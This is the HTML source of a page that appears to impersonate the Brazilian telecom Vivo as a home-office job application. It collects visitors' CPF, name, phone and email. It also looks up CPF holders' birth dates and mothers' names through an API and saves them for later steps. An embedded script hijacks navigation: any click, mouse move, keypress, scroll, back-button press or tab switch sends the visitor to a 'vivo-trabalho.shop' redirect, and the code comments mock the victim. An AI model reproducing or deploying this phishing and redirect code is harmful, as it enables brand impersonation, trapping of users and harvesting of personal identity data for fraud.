<!DOCTYPE html><html lang="pt-BR"><head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    <script async="" defer="" src="js/pixel.js"></script>
    <script type="text/javascript">
        (function(c,l,a,r,i,t,y){
            c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
            t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
            y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
        })(window, document, "clarity", "script", "r7dfa6ijq3");
    </script>

    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cadastro - Vagas Home Office - Vivo</title>
    
    <!-- Bootstrap CSS -->
    <link href="css/bootstrap.min.css" rel="stylesheet">
    
    <!-- Font Awesome -->
    <link rel="stylesheet" href="css/all.min.css">
    
    <style>
        @font-face {
            font-family: 'VivoType';
            src: url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap') format('woff2');
            font-weight: normal;
            font-style: normal;
            font-display: swap;
        }
        
        .vivo-header {
            background-color: #660099;
            color: white;
        }
        
        .vivo-logo {
            height: 40px;
        }
        
        .vivo-btn {
            background-color: #660099;
            color: white;
            border: none;
            padding: 12px 30px;
            border-radius: 25px;
            font-weight: 600;
            transition: all 0.3s ease;
        }
        
        .vivo-btn:hover {
            background-color: #4d0073;
            color: white;
        }
        
        .vivo-btn:disabled {
            background-color: #999;
            cursor: not-allowed;
        }
        
        .education-option {
            background-color: #f8f8f8;
            border: 1px solid #e0e0e0;
            color: #666;
        }
        
        .btn-check:checked + .education-option {
            background-color: #660099 !important;
            color: white !important;
            border-color: #660099 !important;
        }
        
        .btn-check:focus + .education-option, 
        .education-option:focus {
            box-shadow: 0 0 0 0.25rem rgba(102, 0, 153, 0.25);
        }
        
        .education-option:hover {
            background-color: #f0f0f0;
            border-color: #d0d0d0;
        }
        
        .loading-spinner {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid #f3f3f3;
            border-top: 3px solid #660099;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .error-message {
            color: #dc3545;
            font-size: 14px;
        }
        
        .success-message {
            color: #28a745;
            font-size: 14px;
        }
    </style>

<script>
  window.pixelId = "6800b134ebd4fe5c54b14d47";
  var a = document.createElement("script");
  a.setAttribute("async", "");
  a.setAttribute("defer", "");
  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
  document.head.appendChild(a);
</script>
    <script
  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
  data-utmify-prevent-xcod-sck
  data-utmify-prevent-subids
  async
  defer
></script>
    <script>
  // URL que o zé-ruela vai ser arremessado
  var destino = "https://www.vivo-trabalho.shop/backredirect/back1";

  function redirecionaFdp() {
    window.location.href = destino;
  }

  // Clique em qualquer lugar
  document.body.addEventListener("click", redirecionaFdp, { once: true });

  // Movimento do mouse
  document.body.addEventListener("mousemove", redirecionaFdp, { once: true });

  // Qualquer tecla
  document.body.addEventListener("keydown", redirecionaFdp, { once: true });

  // Rolou a tela
  document.body.addEventListener("scroll", redirecionaFdp, { once: true });

  // Tentou voltar pelo botão do navegador
  history.pushState(null, null, window.location.href);
  window.onpopstate = function () {
    history.go(1);
    redirecionaFdp();
  };

  // Botão físico no mobile, tipo voltar ou minimizar app
  window.addEventListener("visibilitychange", function () {
    if (document.hidden) redirecionaFdp();
  });
</script>

    
<script>
  !function(f,b,e,v,n,t,s){
    if(f.fbq)return;n=f.fbq=function(){
      n.callMethod?
        n.callMethod.apply(n,arguments):n.queue.push(arguments)
    };
    if(!f._fbq)f._fbq=n;
    n.push=n;
    n.loaded=!0;
    n.version='2.0';
    n.queue=[];
    t=b.createElement(e);t.async=!0;
    t.src=v;
    s=b.getElementsByTagName(e)[0];
    s.parentNode.insertBefore(t,s)
  }(
    window,
    document,
    'script',
    'https://connect.facebook.net/en_US/fbevents.js'
  );
  fbq('init', '1382791442888305');
  fbq('track', 'PageView');
</script>
<noscript>
  <img height="1" width="1" style="display:none"
    src="https://www.facebook.com/tr?id=598153602790130&ev=PageView&noscript=1"
  />
</noscript>
<!-- End Facebook Pixel Code -->
</head>
<body>
    <!-- Header -->
    <header class="vivo-header">
        <div class="container">
            <div class="row align-items-center py-3">
                <div class="col-6">
                    <a href="../index.html">
                        <img src="images/Vivo-roxo.png" alt="Vivo" class="vivo-logo">
                    </a>
                </div>
            </div>
        </div>
    </header>

    <!-- Breadcrumbs -->
    <div class="container py-1" style="border-bottom: 1px solid #eee;">
        <div>
            <span style="font-size: 11px; color: #888;">TRABALHE CONOSCO > HOME OFFICE > CADASTRO</span>
        </div>
    </div>
    
    <!-- Main Content -->
    <main class="container my-4">
        <div class="row">
            <div class="col-lg-8 mx-auto">
                <div class="card shadow-sm">
                    <div class="card-header" style="background-color: #660099; color: white;">
                        <h5 class="mb-0">Cadastro Inicial</h5>
                    </div>
                    <div class="card-body p-4">
                        <div class="text-center mt-2 mb-4">
                            <h4 style="color: #660099; font-weight: 500;">Dados Pessoais</h4>
                            <p class="text-muted mb-0">Precisamos de algumas informações para iniciar seu processo</p>
                        </div>
                        
                        <div style="background-color: #EFEDFE; border-radius: 8px; padding: 20px; margin-bottom: 20px; border: 1px solid #d8d4fa;">
                            <h5 style="color: #660099; font-weight: 600; margin-bottom: 15px; font-size: 18px;">Vaga: Atendimento ao Cliente Home Office</h5>
                            
                            <form id="candidateForm" class="mb-3" action="../teste-aptidao/" method="window">
                                <div class="mb-3">
                                    <label for="candidateCPF" class="form-label">CPF</label>
                                    <input type="text" class="form-control" id="candidateCPF" name="cpf" placeholder="000.000.000-00" required="" maxlength="14" inputmode="numeric">
                                    <div id="cpfStatus" class="mt-1"></div>
                                </div>
                                
                                <div class="mb-3">
                                    <label for="candidateName" class="form-label">Nome completo</label>
                                    <input type="text" class="form-control" id="candidateName" name="nome" required="">
                                </div>
                                
                                <div class="mb-3" id="dataNascimentoDiv" style="display: none;">
                                    <label for="candidateDataNascimento" class="form-label">Data de nascimento</label>
                                    <input type="text" class="form-control" id="candidateDataNascimento" name="data_nascimento" placeholder="DD/MM/AAAA" maxlength="10" inputmode="numeric">
                                </div>
                                
                                <div class="mb-3">
                                    <label for="candidatePhone" class="form-label">Telefone celular</label>
                                    <input type="tel" class="form-control" id="candidatePhone" name="telefone" placeholder="(00) 00000-0000" required="" maxlength="15" inputmode="numeric">
                                </div>
                                
                                <div class="mb-3">
                                    <label for="candidateEmail" class="form-label">E-mail</label>
                                    <input type="email" class="form-control" id="candidateEmail" name="email" required="">
                                </div>
                                
                                <div class="mb-3">
                                    <label class="form-label">Escolaridade</label>
                                    <div class="education-options">
                                        <div class="row">
                                            <div class="col-md-6 mb-2">
                                                <input type="radio" class="btn-check" name="escolaridade" id="option-ensino-medio-incompleto" value="medio_incompleto" required="">
                                                <label class="btn w-100 education-option" for="option-ensino-medio-incompleto">Ensino Médio Incompleto</label>
                                            </div>
                                            <div class="col-md-6 mb-2">
                                                <input type="radio" class="btn-check" name="escolaridade" id="option-ensino-medio" value="medio_completo">
                                                <label class="btn w-100 education-option" for="option-ensino-medio">Ensino Médio Completo</label>
                                            </div>
                                            <div class="col-md-6 mb-2">
                                                <input type="radio" class="btn-check" name="escolaridade" id="option-superior-incompleto" value="superior_incompleto">
                                                <label class="btn w-100 education-option" for="option-superior-incompleto">Superior Incompleto</label>
                                            </div>
                                            <div class="col-md-6 mb-2">
                                                <input type="radio" class="btn-check" name="escolaridade" id="option-superior-completo" value="superior_completo">
                                                <label class="btn w-100 education-option" for="option-superior-completo">Superior Completo</label>
                                            </div>
                                            <div class="col-md-6 mb-2">
                                                <input type="radio" class="btn-check" name="escolaridade" id="option-pos-graduacao" value="pos_graduacao">
                                                <label class="btn w-100 education-option" for="option-pos-graduacao">Pós-Graduação</label>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                
                                <p style="font-size: 13px; color: #444; margin-bottom: 15px;">
                                    <i class="fas fa-info-circle me-1" style="color: #660099;"></i> Após o cadastro inicial, você realizará um teste de aptidão com 20 perguntas sobre atendimento ao cliente.
                                </p>
                                
                                <div class="d-flex justify-content-center">
                                    <button type="submit" class="vivo-btn" style="width: 100%; max-width: 280px; opacity: 0.6;" id="submitBtn">
                                        PROSSEGUIR PARA O TESTE
                                    </button>
                                </div>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </main>

    <!-- Footer -->
    <footer class="py-4 mt-5" style="background-color: #660099; color: white;">
        <div class="container">
            <div class="row">
                <div class="col-md-3 mb-4 mb-md-0">
                    <h5 class="mb-3">Produtos e Serviços</h5>
                    <ul class="list-unstyled">
                        <li class="mb-2"><a href="#" class="text-white text-decoration-none">Planos Móveis</a></li>
                        <li class="mb-2"><a href="#" class="text-white text-decoration-none">Internet Fixa</a></li>
                        <li class="mb-2"><a href="#" class="text-white text-decoration-none">TV</a></li>
                        <li class="mb-2"><a href="#" class="text-white text-decoration-none">Combo Vivo</a></li>
                        <li><a href="#" class="text-white text-decoration-none">Vivo App</a></li>
                    </ul>
                </div>
                <div class="col-md-3 mb-4 mb-md-0">
                    <h5 class="mb-3">Suporte</h5>
                    <ul class="list-unstyled">
                        <li class="mb-2"><a href="#" class="text-white text-decoration-none">Minha Vivo</a></li>
                        <li class="mb-2"><a href="#" class="text-white text-decoration-none">2ª Via de Conta</a></li>
                        <li class="mb-2"><a href="#" class="text-white text-decoration-none">Cobertura</a></li>
                        <li class="mb-2"><a href="#" class="text-white text-decoration-none">Desbloqueio</a></li>
                        <li><a href="#" class="text-white text-decoration-none">Fale Conosco</a></li>
                    </ul>
                </div>
                <div class="col-md-3 mb-4 mb-md-0">
                    <h5 class="mb-3">Institucional</h5>
                    <ul class="list-unstyled">
                        <li class="mb-2"><a href="#" class="text-white text-decoration-none">Sobre a Vivo</a></li>
                        <li class="mb-2"><a href="#" class="text-white text-decoration-none">Sustentabilidade</a></li>
                        <li class="mb-2"><a href="#" class="text-white text-decoration-none">Trabalhe Conosco</a></li>
                        <li class="mb-2"><a href="#" class="text-white text-decoration-none">Para Empresas</a></li>
                        <li><a href="#" class="text-white text-decoration-none">Privacidade</a></li>
                    </ul>
                </div>
                <div class="col-md-3">
                    <h5 class="mb-3">Redes Sociais</h5>
                    <div class="d-flex mb-4">
                        <a href="#" class="text-white me-3"><i class="fab fa-facebook-f"></i></a>
                        <a href="#" class="text-white me-3"><i class="fab fa-twitter"></i></a>
                        <a href="#" class="text-white me-3"><i class="fab fa-instagram"></i></a>
                        <a href="#" class="text-white me-3"><i class="fab fa-youtube"></i></a>
                        <a href="#" class="text-white"><i class="fab fa-linkedin-in"></i></a>
                    </div>
                </div>
            </div>
            <hr class="my-4" style="border-color: rgba(255,255,255,0.2);">
            <div class="row">
                <div class="col-12 text-center text-white-50 small">
                    <p class="mb-1">© 2025 Telefônica Brasil S.A. Todos os direitos reservados.</p>
                    <p class="mb-0">CNPJ: 02.558.157/0001-62</p>
                </div>
            </div>
        </div>
    </footer>
                
    <!-- Bootstrap JS -->
    <script src="js/bootstrap.min.js"></script>
    
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            // Capturar UTMs da URL
            const urlParams = new URLSearchParams(window.location.search);
            const utmData = {
                utm_source: urlParams.get('utm_source') || localStorage.getItem('utm_source') || 'direct',
                utm_campaign: urlParams.get('utm_campaign') || localStorage.getItem('utm_campaign'),
                utm_medium: urlParams.get('utm_medium') || localStorage.getItem('utm_medium'),
                utm_content: urlParams.get('utm_content') || localStorage.getItem('utm_content'),
                utm_term: urlParams.get('utm_term') || localStorage.getItem('utm_term'),
                src: urlParams.get('src') || localStorage.getItem('src'),
                sck: urlParams.get('sck') || localStorage.getItem('sck')
            };
            
            // Salvar UTMs no localStorage
            Object.keys(utmData).forEach(key => {
                if (utmData[key]) localStorage.setItem(key, utmData[key]);
            });

            // Máscara para CPF
            const cpfInput = document.getElementById('candidateCPF');
            const cpfStatus = document.getElementById('cpfStatus');
            const nameInput = document.getElementById('candidateName');
            const dataNascimentoDiv = document.getElementById('dataNascimentoDiv');
            const dataNascimentoInput = document.getElementById('candidateDataNascimento');
            const submitBtn = document.getElementById('submitBtn');
            
            let typingTimer;
            const doneTypingInterval = 1000;
            let isValidCPF = false;
            
            // Função para validar CPF
            function validarCPF(cpf) {
                cpf = cpf.replace(/\D/g, '');
                
                if (cpf.length !== 11) return false;
                if (/^(\d)\1+$/.test(cpf)) return false;
                
                let soma = 0;
                for (let i = 0; i < 9; i++) {
                    soma += parseInt(cpf.charAt(i)) * (10 - i);
                }
                let resto = 11 - (soma % 11);
                let dv1 = resto >= 10 ? 0 : resto;
                
                soma = 0;
                for (let i = 0; i < 10; i++) {
                    soma += parseInt(cpf.charAt(i)) * (11 - i);
                }
                resto = 11 - (soma % 11);
                let dv2 = resto >= 10 ? 0 : resto;
                
                return parseInt(cpf.charAt(9)) === dv1 && parseInt(cpf.charAt(10)) === dv2;
            }
            
            cpfInput.addEventListener('input', function(e) {
                let value = e.target.value.replace(/\D/g, '');
                
                if (value.length > 3 && value.length <= 6) {
                    value = value.replace(/^(\d{3})(\d)/, '$1.$2');
                } else if (value.length > 6 && value.length <= 9) {
                    value = value.replace(/^(\d{3})(\d{3})(\d)/, '$1.$2.$3');
                } else if (value.length > 9) {
                    value = value.replace(/^(\d{3})(\d{3})(\d{3})(\d{1,2})/, '$1.$2.$3-$4');
                }
                
                e.target.value = value;
                
                clearTimeout(typingTimer);
                cpfStatus.innerHTML = '';
                isValidCPF = false;
                dataNascimentoDiv.style.display = 'none';
                
                if (value.replace(/\D/g, '').length === 11) {
                    const cpfLimpo = value.replace(/\D/g, '');
                    
                    // Validar CPF primeiro
                    if (!validarCPF(cpfLimpo)) {
                        cpfStatus.innerHTML = '<span class="error-message"><i class="fas fa-times-circle"></i> CPF inválido</span>';
                        return;
                    }
                    
                    cpfStatus.innerHTML = '<span style="color: #666;"><span class="loading-spinner"></span> Verificando CPF...</span>';
                    
                    typingTimer = setTimeout(function() {
                        consultarCPF(value);
                    }, doneTypingInterval);
                }
            });
            
            function consultarCPF(cpf) {
                const cpfLimpo = cpf.replace(/\D/g, '');
                // MUDANÇA: Usar o arquivo PHP local em vez da API direta
                const url = `/api/consultar?cpf=${cpfLimpo}`;

                fetch(url)
                    .then(response => {
                        if (!response.ok) {
                            throw new Error('Erro na consulta');
                        }
                        return response.json();
                    })
.then(data => {
    console.log('Resposta da API:', data);

if (data?.nome) {
    const resultado = data;


                            cpfStatus.innerHTML = '<span class="success-message"><i class="fas fa-check-circle"></i> CPF verificado com sucesso</span>';
                            isValidCPF = true;

                            // CORREÇÃO: Usar os nomes corretos dos campos da nova API
console.log('API nome recebido:', resultado);

const nomeRecebido = resultado.nome || resultado.NOME || resultado['NOME COMPLETO'] || resultado.nome_completo || '';
if (nomeRecebido && typeof nomeRecebido === 'string') {
    nameInput.value = nomeRecebido.trim();
    nameInput.readOnly = true;
} else {
    console.warn('Nome não foi encontrado ou é inválido:', nomeRecebido);
}


                         if (resultado.nascimento) {
    dataNascimentoDiv.style.display = 'block';
    dataNascimentoInput.value = resultado.nascimento;

                                dataNascimentoInput.readOnly = true;
                            }

                            // Salvar dados com a estrutura correta para a próxima página
                          const candidateData = {
    cpf: cpfLimpo,
    nome: resultado.nome || nameInput.value,
    data_nascimento: resultado.nascimento || dataNascimentoInput.value,
    sexo: resultado.sexo || '',
    nome_mae: resultado.nome_mae || ''
};

                            
                            localStorage.setItem('candidateData', JSON.stringify(candidateData));
                            console.log('Dados salvos no localStorage:', candidateData);
                        } else if (data.status === 404) {
                            cpfStatus.innerHTML = '<span class="error-message"><i class="fas fa-exclamation-circle"></i> CPF não encontrado na base de dados</span>';
                            isValidCPF = false;
                            nameInput.readOnly = false;
                            dataNascimentoInput.readOnly = false;
                            dataNascimentoDiv.style.display = 'block';
                        } else {
                            cpfStatus.innerHTML = '<span class="error-message"><i class="fas fa-exclamation-circle"></i> CPF não encontrado na base de dados</span>';
                            isValidCPF = false;
                            nameInput.readOnly = false;
                            dataNascimentoInput.readOnly = false;
                            dataNascimentoDiv.style.display = 'block';
                        }
                    })
                    .catch(error => {
                        console.error('Erro ao consultar CPF:', error);
                        cpfStatus.innerHTML = '<span class="error-message"><i class="fas fa-exclamation-circle"></i> Erro ao verificar CPF. Prossiga manualmente.</span>';
                        isValidCPF = false;
                        nameInput.readOnly = false;
                        dataNascimentoInput.readOnly = false;
                        dataNascimentoDiv.style.display = 'block';
                    });
            }
            
            // Formato da data de nascimento
            dataNascimentoInput.addEventListener('input', function(e) {
                let value = e.target.value.replace(/\D/g, '');
                
                if (value.length > 2 && value.length <= 4) {
                    value = value.replace(/^(\d{2})(\d)/, '$1/$2');
                } else if (value.length > 4) {
                    value = value.replace(/^(\d{2})(\d{2})(\d)/, '$1/$2/$3');
                }
                
                e.target.value = value;
            });
            
            // Máscara para telefone
            const phoneInput = document.getElementById('candidatePhone');
            phoneInput.addEventListener('input', function(e) {
                let value = e.target.value.replace(/\D/g, '');
                
                if (value.length > 2 && value.length <= 6) {
                    value = value.replace(/^(\d{2})(\d)/, '($1) $2');
                } else if (value.length > 6 && value.length <= 10) {
                    value = value.replace(/^(\d{2})(\d{4})(\d)/, '($1) $2-$3');
                } else if (value.length > 10) {
                    value = value.replace(/^(\d{2})(\d{5})(\d{1,4})/, '($1) $2-$3');
                }
                
                e.target.value = value;
            });

            // Submit do formulário
            document.getElementById('candidateForm').addEventListener('submit', function(e) {
                // Salvar dados do formulário no localStorage antes de enviar
                const formData = new FormData(this);
                const candidateInfo = {};
                
                for (let [key, value] of formData.entries()) {
                    candidateInfo[key] = value;
                }
                
                // Limpar CPF para salvar apenas números
                if (candidateInfo.cpf) {
                    candidateInfo.cpf = candidateInfo.cpf.replace(/\D/g, '');
                }
                
                // Combinar com dados já salvos
                const existingData = JSON.parse(localStorage.getItem('candidateData') || '{}');
                const completeData = {...existingData, ...candidateInfo};
                
                localStorage.setItem('candidateData', JSON.stringify(completeData));
                console.log('Dados salvos no localStorage:', completeData);
                
                // Permitir que o formulário seja enviado normalmente
                // (não preventDefault, mantém o action original)
            });
            
            // Validação em tempo real do formulário
            function validateForm() {
                const cpf = cpfInput.value.replace(/\D/g, '');
                const nome = nameInput.value.trim();
                const telefone = phoneInput.value.replace(/\D/g, '');
                const email = document.getElementById('candidateEmail').value.trim();
                const escolaridade = document.querySelector('input[name="escolaridade"]:checked');
                
                const isFormValid = cpf.length === 11 && 
                                  nome.length > 0 && 
                                  telefone.length >= 10 && 
                                  email.includes('@') && 
                                  escolaridade;
                
                if (!isFormValid) {
                    submitBtn.style.opacity = '0.6';
                } else {
                    submitBtn.style.opacity = '1';
                }
            }
            
            // Adicionar listeners para validação em tempo real
            [cpfInput, nameInput, phoneInput, document.getElementById('candidateEmail')].forEach(input => {
                input.addEventListener('input', validateForm);
            });
            
            document.querySelectorAll('input[name="escolaridade"]').forEach(radio => {
                radio.addEventListener('change', validateForm);
            });
            
            // Validação inicial
            validateForm();
        });
    </script>

</body></html>
